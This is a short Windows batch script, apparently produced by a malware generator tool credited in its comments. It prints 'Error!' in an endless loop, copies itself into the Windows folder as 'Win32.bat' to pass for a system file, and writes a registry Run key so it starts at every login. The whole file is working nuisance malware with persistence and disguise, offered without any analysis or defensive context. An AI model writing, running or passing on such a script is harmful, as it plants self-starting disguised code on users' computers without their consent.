@echo off
:x
echo Error!
copy %0 C:\Windows\Win32.bat > nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Win32 /t REG_SZ /d C:\Windows\Win32.bat /f 
goto x
rem Created by: Generator Death by upO [5.0]
rem http://x3-team.ru/
